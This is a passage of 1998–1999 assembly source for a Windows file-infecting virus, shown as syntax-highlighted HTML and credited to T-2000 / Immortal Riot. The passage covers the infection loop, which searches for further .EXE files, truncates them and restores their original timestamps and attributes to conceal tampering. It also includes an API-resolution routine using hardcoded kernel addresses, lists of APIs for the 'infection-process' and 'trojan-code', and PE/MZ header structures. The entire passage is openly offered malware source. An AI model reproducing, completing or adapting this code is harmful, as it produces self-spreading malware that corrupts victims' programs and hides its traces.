</span><span class="sc5">Host_Size</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">SetFilePointer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">SetEndOfFile</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Restore original filedates</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">; and times.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">File_Handle</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">SetFileTime</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">CloseHandle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Restore_Attr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Find_Next_File</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">

                </span><span class="sc1">; Now go find the next .EXE-file.</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Search_Buffer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">FindNextFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Infect_Loop</span><span class="sc0">

</span><span class="sc5">Exit_Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Author</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'(c) 1998-1999 by T-2000 / Immortal Riot'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; EAX = Offset to module-name.</span><span class="sc0">
</span><span class="sc1">; EDI = Pointer to buffer API-addresses.</span><span class="sc0">
</span><span class="sc5">Retrieve_API</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                </span><span class="sc1">; EBX holds the delta-offset.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Module-name.</span><span class="sc0">

        </span><span class="sc1">; === Get the base-address of the given module. ===</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc5">GetModuleHandleA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Exit_Get_API</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                </span><span class="sc1">; EBP = Module-base.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">                 </span><span class="sc1">; ESI = Start API-names.</span><span class="sc0">

</span><span class="sc5">Retrieve_Addr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Retrieve the API's address.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">+(</span><span class="sc5">GetProcAddress</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Store the API-address.</span><span class="sc0">
                </span><span class="sc6">STOSD</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Exit_Get_API</span><span class="sc0">

</span><span class="sc5">Find_End_API</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">                           </span><span class="sc1">; Go to next API-name.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Reached the end of ASCIIZ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_End_API</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; We did 'em all?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Retrieve_Addr</span><span class="sc0">           </span><span class="sc1">; Nope, so continue loop.</span><span class="sc0">

</span><span class="sc5">Exit_Get_API</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; Don't use a lame AND to convert to uppercase, it'll</span><span class="sc0">
</span><span class="sc1">; screw things up with non-alfabethical characters.</span><span class="sc0">
</span><span class="sc5">Upcase_EAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_AL</span><span class="sc0">

                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_AL</span><span class="sc0">

                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_AL</span><span class="sc0">

                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">Upcase_AL</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Upcase_AL</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Exit_Upcase_AL</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">

</span><span class="sc5">Exit_Upcase_AL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; ********************* DATA AREA *******************************************</span><span class="sc0">


                        </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">Debug_Mode</span><span class="sc0">

</span><span class="sc5">File_Spec</span><span class="sc0">               </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'DUM*.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Searchmask for debugmode.</span><span class="sc0">

                        </span><span class="sc9">ELSE</span><span class="sc0">

</span><span class="sc5">File_Spec</span><span class="sc0">               </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Searchmask for wildmode.</span><span class="sc0">

                        </span><span class="sc9">ENDIF</span><span class="sc0">


        </span><span class="sc1">; All API's used by the actual infection-process.</span><span class="sc0">

</span><span class="sc5">KERNEL32_API</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'KERNEL32.dll'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc1">; This shit is only used by the trojan-code.</span><span class="sc0">

</span><span class="sc5">USER32_API</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'USER32.dll'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MessageBeep'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc1">; Fuck, these are hardcoded!</span><span class="sc0">

</span><span class="sc5">GetModuleHandleA</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0BFF775BDh</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0BFF76D5Ch</span><span class="sc0">


</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">K32_API_Addresses</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileTime</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileAttributesA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">U32_API_Addresses</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">MessageBoxA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MessageBeep</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Current_Directory</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Windows_Directory</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">System_Directory</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">Infect_Counter</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Victim_Last_Write_Time</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Victim_Last_Access_Time</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Victim_Creation_Time</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Search_Buffer</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">666</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">Virus_End_Mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; </span><span class="sc0">


</span><span class="sc5">Section_Header</span><span class="sc0">          </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Section_Name</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Section_Size_Virtual</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Section_RVA</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Section_Size_Raw</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Section_Start</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Section_Flags</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Section_Header</span><span class="sc0">          </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_First_Next_Win32</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">File_Attributes</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Creation_Time</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last_Accessed_Time</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last_Written_Time</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Size_High</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Size_Low</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_Reserved_1</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_Reserved_2</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Find_File_Name</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_DOS_File_Name</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_First_Next_Win32</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">EXE_Mark</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Marker valid .EXE-file: MZ or ZM.</span><span class="sc0">
</span><span class="sc5">Image_Mod_512</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_512_Pages</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Items</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header_Size_Mem</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Min_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_IP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_CS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Table</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">PE_Header</span><span class="sc0">               </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">PE_Mark</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; PE-marker (PE/0/0).</span><span class="sc0">
</span><span class="sc5">CPU_Type</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Number_Of_Sections</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reserved_1</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Headers_Size</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PE_Flags</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
